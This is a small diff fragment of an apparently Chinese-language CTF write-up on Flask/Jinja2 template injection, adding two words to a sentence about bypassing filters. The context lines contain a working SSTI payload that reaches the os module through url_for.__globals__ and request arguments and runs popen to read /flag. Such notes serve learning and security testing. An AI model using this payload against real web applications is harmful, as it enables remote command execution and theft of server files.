@@ -50,7 +50,7 @@ get_data方法直接读打开过的文件内容
 ?name={{url_for.__globals__[request.args.a][request.args.b](request.args.c).read()}}&a=os&b=popen&c=cat /flag
 ```
 
-下面拿到os后继续传参绕过request.args.a
+下面拿到os后继续传参绕过request.args.a进行popen
 
 字符串拼接绕过
 ```
